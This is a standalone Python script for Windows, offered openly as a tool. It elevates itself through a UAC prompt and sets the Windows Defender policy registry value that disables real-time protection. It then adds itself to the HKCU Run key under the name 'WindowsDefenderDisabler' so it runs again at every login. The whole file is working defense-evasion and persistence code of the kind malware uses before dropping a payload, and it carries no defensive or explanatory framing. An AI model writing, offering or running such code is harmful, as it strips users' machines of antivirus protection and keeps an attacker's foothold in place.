import winreg
import os
import sys
import ctypes
import subprocess


def is_admin():
    """Check if script is running with administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def disable_real_time_protection():
    """Disable Windows Defender Real-Time Protection"""
    try:
        key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"

        # Open or create the key
        key = winreg.CreateKey(
            winreg.HKEY_LOCAL_MACHINE,
            key_path
        )

        # Set DisableRealtimeMonitoring to 1 (disabled)
        winreg.SetValueEx(
            key,
            "DisableRealtimeMonitoring",
            0,
            winreg.REG_DWORD,
            1
        )

        winreg.CloseKey(key)
        print("Real-Time Protection disabled.")

    except Exception as e:
        print(f"Error disabling protection: {e}")


def create_startup_reg_entry():
    """Create a registry entry to run the script at startup"""
    try:
        # Path to this script
        script_path = os.path.abspath(sys.argv[0])

        # Create startup key
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_ALL_ACCESS
        )

        # Add script to startup
        winreg.SetValueEx(
            key,
            "WindowsDefenderDisabler",
            0,
            winreg.REG_SZ,
            f'python "{script_path}"'
        )

        winreg.CloseKey(key)
        print("Startup entry created successfully.")

    except Exception as e:
        print(f"Error creating startup entry: {e}")


def main():
    # Check for admin rights
    if not is_admin():
        # Re-run the script with admin rights
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable,
            " ".join(sys.argv),
            None,
            1
        )
        sys.exit()

    # Disable real-time protection
    disable_real_time_protection()

    # Create startup registry entry
    create_startup_reg_entry()


if __name__ == "__main__":
    main()